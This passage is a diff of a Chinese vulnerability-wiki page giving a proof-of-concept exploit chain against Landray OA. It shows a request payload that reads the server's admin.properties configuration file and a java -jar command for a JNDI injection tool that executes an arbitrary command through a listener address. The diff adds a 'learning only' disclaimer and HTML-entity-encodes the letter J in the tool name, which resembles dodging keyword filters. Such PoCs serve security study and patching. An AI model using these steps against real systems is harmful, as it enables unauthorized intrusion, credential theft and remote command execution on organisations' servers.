@@ -61,17 +61,20 @@ var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
 
 ```plain
 http://xxx.xxx.xxx.xxx/admin.do
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ![3](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202090126340.png)
 
 使用工具执行命令
 
-https://github.com/welk1n/JNDI-Injection-Exploit
+https://github.com/welk1n/&#74;NDI-Injection-Exploit
 
 ```plain
-java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]
-```
+java -jar &#74;NDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</code></pre>
+
+</details>
 
 运行工具监听端口 ping dnslog测试 命令执行 (蓝凌OA 默认使用的是 JDK 1.7)
 
